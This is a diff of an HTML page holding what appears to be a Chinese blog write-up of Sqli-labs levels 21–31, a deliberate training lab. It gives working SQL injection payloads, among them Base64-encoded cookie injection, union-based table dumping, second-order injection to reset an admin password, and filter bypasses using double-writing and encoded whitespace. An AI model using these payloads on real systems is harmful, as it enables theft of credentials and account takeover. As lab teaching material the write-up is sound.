@@ -10,12 +10,13 @@
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="google" content="notranslate">
     <meta name="keywords" content="TriDiamond Obsidian,"> 
-    <meta name="description" content="前一部分链接：第11-20关Write-up
-Less-21与Less-20类似，只是对变量Cookiee进行了Base64加密，并且使用单引号和括号进行包裹
+    <meta name="description" content="Less-21与Less-20类似，只是对变量Cookiee进行了Base64加密，并且使用单引号和括号进行包裹
 
 将payload进行加密
 
-加入到 ,"> 
+加入到 Cookie中，注入成功
+
+Less-22与前,"> 
     <meta name="author" content="Knlvre"> 
     <link rel="alternative" href="atom.xml" title="Knlvre" type="application/atom+xml"> 
     <link rel="icon" href="/knlvre.github.io/img/favicon.png"> 
@@ -89,13 +90,13 @@ Less-21与Less-20类似，只是对变量Cookiee进行了Base64加密，并且�
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>Words count</i>
-                    11k
+                    10k
                 </span>
                 
                 
                 <span>
                     <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
-                    10 mins.
+                    9 mins.
                 </span>
                 
                 
@@ -129,26 +130,27 @@ Less-21与Less-20类似，只是对变量Cookiee进行了Base64加密，并且�
 <div class="article">
     <div class='main'>
         <div class="content markdown animated fadeIn">
-            <p>前一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/01/30/Sqli-labs%20%E7%AC%AC11-20%E5%85%B3/">第11-20关Write-up</a></p>
-<h2 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h2><p>与<code>Less-20</code>类似，只是对变量<code>Cookiee</code>进行了<code>Base64</code>加密，并且使用单引号和括号进行包裹</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/1-1.png" alt="1-1"></p>
+            <h2 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h2><p>与<code>Less-20</code>类似，只是对变量<code>Cookiee</code>进行了<code>Base64</code>加密，并且使用单引号和括号进行包裹</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/1-1.png" alt></p>
 <p>将<code>payload</code>进行加密</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/1-2.png" alt="1-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/1-2.png" alt></p>
 <p>加入到 <code>Cookie</code>中，注入成功</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/1-3.png" alt="1-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/1-3.png" alt></p>
 <h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><p>与前面关卡类似，只是对<code>$cookee</code>包括采用了<code>双引号</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/2-1.png" alt="2-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/2-1.png" alt></p>
 <p><code>Base64</code>加密一下<code>payload</code>：</p>
-<pre><code>&quot; and extractvalue(1,concat(0x7e,(select group_concat(username,password) from users where id=2),0x7e))#
+<pre><code class="Code">&quot; and extractvalue(1,concat(0x7e,(select group_concat(username,password) from users where id=2),0x7e))#
 
 加密后：
 IiBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQodXNlcm5hbWUscGFzc3dvcmQpIGZyb20gdXNlcnMgd2hlcmUgaWQ9MiksMHg3ZSkpIw
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/2-2.png" alt="2-2"></p>
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/2-2.png" alt></p>
 <h2 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h2><p>查看源代码，本关将注释符：<code>#、--</code>进行了过滤，查询语句是通过<code>单引号</code>来包裹<code>$id</code>的</p>
 <p>所以只需要将结尾的单引号处理掉就好了</p>
 <p>爆表名：</p>
-<pre><code>?id=-1&#39; union select 1,（select group_concat(table_name) from information_schema.tables where table_schema=database()）,3 and &#39;1&#39;=&#39;1
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/3-1.png" alt="3-1"></p>
+<pre><code class="Code">?id=-1&#39; union select 1,（select group_concat(table_name) from information_schema.tables where table_schema=database()）,3 and &#39;1&#39;=&#39;1
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/3-1.png" alt="3-1"></p>
 <p>其他的语句自行构造，不再赘述</p>
 <h2 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h2><p>本关考察<code>二次排序注入（二次注入、存储型注入）</code></p>
 <p>查看本关源代码</p>
@@ -158,7 +160,7 @@ IiBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQodXNlcm5h
 <p><code>修改密码</code>时的语句为：</p>
 <pre><code class="mysql">UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39;
 </code></pre>
-<p>结题思路：</p>
+<p>解题思路：</p>
 <p>创建一个用户，名为<code>admin&#39;#</code>，密码随意，数据库执行以下语句：</p>
 <pre><code class="mysql">insert into users ( username, password) values(\&quot;admin&#39;#\&quot;, \&quot;666\&quot;)
 </code></pre>
@@ -168,17 +170,17 @@ IiBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQodXNlcm5h
 <p>登陆成功，可以直接<code>修改密码</code>，数据库执行了以下语句：</p>
 <pre><code class="mysql">UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39;# and password=&#39;$curr_pass&#39;
 </code></pre>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/4-3.png" alt="4-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/4-3.png" alt></p>
 <p>此时<code>admin</code>用户的密码已经改成我们修改的那个密码了，可以直接登录</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/4-4.png" alt="4-4"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/4-4.png" alt></p>
 <h2 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h2><p><code>单引号包裹</code>、题目提示我们<code>or</code>和<code>and</code>被过滤掉了</p>
 <p>但是影响并不是很大，因为可以用<code>双写</code>绕过</p>
 <p><code>information</code>里面包含<code>or</code>，记得双写绕过就可以了：<code>infoorrmation</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/5-1.png" alt="5-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/5-1.png" alt></p>
 <p>其他的不再赘述</p>
 <h2 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h2><p><code>没有用符号包裹</code>、同样提示我们<code>or</code>和<code>and</code>被过滤掉了</p>
 <p>其他和Less-25一样</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/5-2.png" alt="5-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/5-2.png" alt></p>
 <h2 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h2><p>过滤规则，过滤了：<code>or、and、/、*、--、#、\s空格、/、\\</code></p>
 <pre><code class="php">function blacklist($id)
 {
@@ -193,19 +195,22 @@ IiBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQodXNlcm5h
 }
 </code></pre>
 <p>（1）<code>or</code>和<code>and</code>的绕过</p>
-<pre><code>or：用||代替
+<pre><code class="Code">or：用||代替
 and:用&amp;&amp;代替
-</code></pre><p>（2）<code>空格</code>的绕过</p>
-<pre><code>%09：tab键（水平）
+</code></pre>
+<p>（2）<code>空格</code>的绕过</p>
+<pre><code class="Code">%09：tab键（水平）
 %0b：tab键（垂直）
 %0a：新建一行
 %0c：新的一页
 %0d：return功能
 %a0：空格
-</code></pre><p>由于<code>井号#</code>和<code>--</code>被过滤的，只能用<code>||&#39;1</code>处理掉末尾的单引号</p>
+</code></pre>
+<p>由于<code>井号#</code>和<code>--</code>被过滤的，只能用<code>||&#39;1</code>处理掉末尾的单引号</p>
 <p>不过我的环境好像不能使用上面的几种变换绕过空格，但是从27关开始又可以</p>
-<pre><code>?id=0&#39;%0aunion%0aselect%0a1,2,3%0a||%0a&#39;1
-</code></pre><h2 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h2><p>本关与前一关的区别在于，关闭了mysql报错</p>
+<pre><code class="Code">?id=0&#39;%0aunion%0aselect%0a1,2,3%0a||%0a&#39;1
+</code></pre>
+<h2 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h2><p>本关与前一关的区别在于，关闭了mysql报错</p>
 <pre><code class="php">$sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;
 
 //print_r(mysql_error());
@@ -243,8 +248,9 @@ return $id;
 </code></pre>
 <p>其他与前一关保持一致</p>
 <p>payload：</p>
-<pre><code>?id=0&quot;%0aunion%0aSeLect%0a1,2,3%0a||%0a&quot;1
-</code></pre><h2 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h2><p>过滤规则：</p>
+<pre><code class="Code">?id=0&quot;%0aunion%0aSeLect%0a1,2,3%0a||%0a&quot;1
+</code></pre>
+<h2 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h2><p>过滤规则：</p>
 <pre><code class="php">function blacklist($id)
 {
 $id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);                //strip out /*
@@ -260,8 +266,9 @@ return $id;
 <p>本关不单独过滤<code>union</code>或<code>select</code>单词，而是过滤<code>union select</code>这个整体</p>
 <p>解决办法就是同样的道理，双写就行</p>
 <p>payload：</p>
-<pre><code>?id=0&#39;)%0aunion%0aunion%0aselectselect%0a1,2,3%0a||%0a(&#39;1
-</code></pre><h2 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h2><p>过滤规则：</p>
+<pre><code class="Code">?id=0&#39;)%0aunion%0aunion%0aselectselect%0a1,2,3%0a||%0a(&#39;1
+</code></pre>
+<h2 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h2><p>过滤规则：</p>
 <pre><code class="php">function blacklist($id)
 {
 //$id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);                //strip out /*
@@ -277,8 +284,9 @@ return $id;
 <p>这里注意到其他规则已经注释掉，只过滤<code>union select</code>这个整体</p>
 <p>过滤规则更少更简单了，前一关的payload可以继续使用，当然也可以使用更简单的</p>
 <p>payload：</p>
-<pre><code>?id=0&#39;) union union selectselect 1,2,3--+
-</code></pre><h2 id="Less-29至31"><a href="#Less-29至31" class="headerlink" title="Less-29至31"></a>Less-29至31</h2><p>这一部分训练的是HPP（HTTP Parameter Pollution），俗称HTTP参数污染。</p>
+<pre><code class="Code">?id=0&#39;) union union selectselect 1,2,3--+
+</code></pre>
+<h2 id="Less-29至31"><a href="#Less-29至31" class="headerlink" title="Less-29至31"></a>Less-29至31</h2><p>这一部分训练的是HPP（HTTP Parameter Pollution），俗称HTTP参数污染。</p>
 <p>开始看这题并没有发现index.php有WAF，后来发现原来是index.jsp用了WAF，关键代码如下。</p>
 <pre><code class="java">&lt;%
     String id = request.getParameter(&quot;id&quot;);
@@ -293,7 +301,6 @@ return $id;
 %&gt;
 </code></pre>
 <p>至此，21-30关的Write-up结束</p>
-<p>后一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/02/01/Sqli-labs%20%E7%AC%AC31-40%E5%85%B3/">第31-40关Write-up</a></p>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls"
